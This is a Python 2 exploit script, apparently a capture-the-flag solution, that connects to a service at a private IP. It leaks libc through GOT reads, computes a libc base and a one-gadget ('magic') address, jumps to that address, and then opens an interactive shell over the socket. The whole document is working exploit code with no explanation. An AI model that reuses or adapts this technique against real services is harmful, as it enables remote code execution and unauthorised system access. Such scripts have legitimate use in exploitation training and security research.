from socket import *
from telnetlib import *
import struct

p = lambda x:struct.pack("<L",x)
up = lambda x:struct.unpack("<L",x)

HOST = "10.211.55.8"
PORT = 12345

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST,PORT))


def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

libc_start_got = 0x600AF0
setbuf_got = 0x600AE0
main = 0x400646
magic_offset = 0x4652c
stdout = 0x3BF870
print recvuntil("Read location?")
s.send(str(libc_start_got) + "\n")
print recvuntil("Jump location?")
s.send(str(main) + "\n")
print recvuntil("Read location?")
s.send(str(setbuf_got) + "\n")
print recvuntil("Value: ")
libc_base = int(recvuntil("\n"),16) - 0x721e0
magic = libc_base + magic_offset
print "[*] LIBC Base: " + hex(libc_base)
print "[*] Magic Gadget: " + hex(magic)
print recvuntil("Jump location?")
s.send(str(magic) + "\n")







t = Telnet()
t.sock = s
t.interact()

